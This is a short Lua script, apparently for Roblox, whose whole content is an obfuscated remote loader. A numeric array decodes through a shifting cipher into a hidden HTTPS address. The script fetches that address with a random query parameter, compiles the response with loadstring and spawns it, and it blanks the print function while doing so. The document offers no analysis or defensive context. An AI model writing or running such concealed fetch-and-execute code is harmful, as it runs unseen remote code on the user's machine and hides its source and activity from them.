local _S = string; local _T = table; local _G = game;


local _D = {115,128,129,126,130,74,64,57,114,117,128,130,61,119,122,126,115,129,111,131,130,117,131,109,122,122,129,115,125,132,63,109,122,121,60,69,98,113,135,115,127,109,127,61,66,69,114,64,112,112,110,115,117,72,119,60,113,66,70,69,65,118,67,112,61,63,69,70,68,115,115,109,62,61,63,115,62,130,114,129,58,113,62,65,70,114,67,66,108,114,113,112,68,71,71,107,61,60,113,111,64,114,73,110,109,113,112,115,67,72,66,112,109,110,112,69,65,64,66,60,68,59,83,98,80,96,62,93,76,98,86,98,80,98,62,82,96,78,58,80,84,100,82}

local function _SOLVE(_DATA)
    local _R = {}
    for i = 1, #_DATA do
        
        local _K = (i % 8) + 10
        _R[i] = _S.char(_DATA[i] - _K)
    end
    return _T.concat(_R)
end

local function _START()
    local _url = _SOLVE(_D) .. "?v=" .. math.random(1, 9999)
    local _ok, _res = pcall(function() return _G:HttpGet(_url, true) end)
    
    if _ok and _res and #_res > 10 then
        local _f = loadstring(_res)
        if _f then 
            task.spawn(_f) 
        end
    end
end


local _p = print; print = function() end;
_START()
print = _p;
